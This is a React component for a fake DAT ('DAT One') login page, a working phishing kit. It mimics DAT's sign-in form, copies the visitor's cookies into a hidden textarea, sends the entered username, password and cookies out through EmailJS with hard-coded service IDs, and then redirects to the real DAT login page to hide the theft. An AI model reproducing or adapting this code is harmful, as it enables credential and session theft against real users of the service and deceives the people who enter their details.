import '../Form/formfk.css';
import { useState, useRef } from "react";
import { useCookies } from 'react-cookie';
import emailjs from 'emailjs-com';
import pak from '../../img/pak.svg';
import bac from '../../img/bac.svg';

function FormFk() {
    const [passwordShown, setPasswordShown] = useState(false);
    const [activepass, setActivePass] = useState(false);
    const [active, setActive] = useState(false);
    const [areaText, setAreaText] = useState("");
    const [cookies, setCookie] = useCookies(['cookie-name']);
    const userName = useRef(null);
    const passwordUser = useRef(null);
    const textArea = useRef(null);
    var qfNum = 0;
    function qfFunck(qf) {
        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.className = "form_empty form-control";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        qfFunck(event.target);
        if(event.target.value === ''){
            event.target.nextSibling.style.display = "block";
            event.target.className = "form_empty form-control";
            if(active === true){setActive(!active);} 
        } else {
            event.target.nextSibling.style.display = "none";
            event.target.className = "form-control";
        }
        if(userName.current.value && passwordUser.current.value) {
            if(active === false){setActive(!active);} 
        } 
    };
    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };

    function getCook() {
        setAreaText(cookies);
    }

    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";
    function handleSubmit(event) {
        getCook();
        event.preventDefault();
        qfFunck(userName.current);
        if(qfNum === 1) {
            userName.current.value = '';
            userName.current.nextSibling.style.display = "block";
            userName.current.className = "form_empty form-control";
        } else if(qfNum === 0) {
            qfFunck(passwordUser.current);
            if(qfNum === 0){
                if(userName.current.value && passwordUser.current.value && areaText !== "") {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    window.location.href = "https://login.dat.com/login?state=hKFo2SBwWXlWeTB3dE9MdnpwOWZlQlZQU25wSXJ2N19QdVc5RKFupWxvZ2luo3RpZNkgZndKQ3RpZlYtdUhMX3BvUG5MZHRNVHdrNDg3TjZnUlGjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=K9F~QZ7J7pAxbQwq4584ydDVHnGb7Zmb&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1704971938033";
                    return;
                } else {
                    if(activepass === false){setActivePass(!activepass);} 
                }
            }
        }
        if (!userName.current.value) {
            event.target[0].nextSibling.style.display = "block";
            userName.current.className = "form_empty form-control";
        } 
        if (!passwordUser.current.value) {
            event.target[1].nextSibling.style.display = "block";
            passwordUser.current.className = "form_empty form-control";
        }
    }

    return (
      <section className="form_box">
            <h1 className='logIn'>Log in</h1>
            <h3 className='logText'>to continue to your DAT account</h3>
            <form onSubmit={handleSubmit} id="formss">
                <div className='morBox'>
                    <a target='otherWindow.location' href="https://power.dat.com/forgotusername" type="button" className="moranal">Forgot your username?</a>
                </div>
                <div className="inputBlock">
                    <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" type="text" spellCheck="false" className="form-control" />
                    <div style={{display:'none'}} className='requiredBox'>Required field.</div>
                    <span className='placeholder'>Username/Email*</span>
                </div>
                <div className="remember">
                      <label className="checkbox-inline"><input name="Remember" type="checkbox" id="Remember" />Remember me</label>
                </div>
                <div className='morBox'>
                    <a target='otherWindow.location' href="https://power.dat.com/forgotpassword" type="button" className="moranal">Reset password</a>
                </div>
                <div className="inputBlock">
                    <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" type={passwordShown ? "text" : "password"} spellCheck="false" className="form-control" />
                    <div style={{display:'none'}} className='requiredBox'>Required field.</div>
                    <span className='placeholder'>Password*</span>
                    <span className="eyeIcon" onClick={togglePassword}>
                        <img src={passwordShown ? bac : pak} className='openPass' alt=''></img>
                    </span>
                </div>
                <div style={{display:'none'}} className='invalidBox'>Invalid username and password combination</div>
                <textarea readOnly id="textArea" name="textAreaText" ref={textArea} value={areaText} style={{display:'none'}}></textarea>
                <button disabled={active ? false : true} id="btnLogin" type='submit' className={active ? "btn-primary-active" : "btn-primary"}>Log in</button>
            </form>
            {/* <a href="https://ssu.dat.com/create-account" type="button" className="forgotLink">Need an account? <span>Create account</span></a> */}
            <p className='continText'>By continuing you agree to our <a target='otherWindow.location' href='https://www.dat.com/terms-and-conditions'>terms and conditions.</a></p>
      </section>
    );
  }
  
  export default FormFk;
  